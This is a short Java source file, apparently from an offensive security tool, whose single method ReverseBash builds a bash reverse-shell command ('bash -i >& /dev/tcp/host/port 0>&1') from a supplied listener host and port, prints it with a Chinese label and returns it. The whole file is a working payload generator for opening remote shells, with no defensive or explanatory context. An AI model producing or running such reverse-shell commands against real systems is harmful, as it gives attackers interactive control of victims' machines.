package com.swordHostDemo.controller;

/**
 * @date: 2022/12/29 20:30
 * @description:
 */
public class Reverse {
    public static String ReverseBash(String Lhost, String Lport) {
        String str = "bash -i >& /dev/tcp/" + Lhost + "/" + Lport + " 0>&1";

        System.out.println("原始字符串：" + str);
        return str;
    }

}
